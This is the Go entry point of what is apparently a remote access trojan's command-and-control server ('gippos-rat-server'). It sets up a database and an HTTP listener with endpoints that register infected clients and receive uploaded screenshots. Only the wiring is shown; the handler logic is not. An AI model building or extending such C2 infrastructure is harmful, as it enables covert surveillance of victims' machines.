package main

import (
	"fmt"
	"gippos-rat-server/internal/handler"
	"gippos-rat-server/internal/logger"
	"gippos-rat-server/internal/service"
	"gippos-rat-server/internal/storage"
	"net/http"
	"time"
)

const (
	PLUS = "[+]"
	MIN  = "[-]"
	MUL  = "[*]"
)

func main() {
	db, err := storage.InitDB()
	if err != nil {
		logger.Log.Fatalf("Failed to connect to database: %v", err)
	}

	services := service.NewServiceC2(db)
	handlers := handler.NewHandlerC2(services)

	fmt.Printf("%s Server started...", PLUS)

	server := http.Server{
		Addr:              "127.0.0.1:8080",
		ReadHeaderTimeout: 30 * time.Second,
	}

	http.HandleFunc("/register", handlers.Register)
	http.HandleFunc("/upload", handlers.UploadScreen)

	if err := server.ListenAndServe(); err != nil {
		logger.Log.Fatalf("Failed to start server: %v", err)
		fmt.Printf("%s Failed start server", MIN)
	}
}
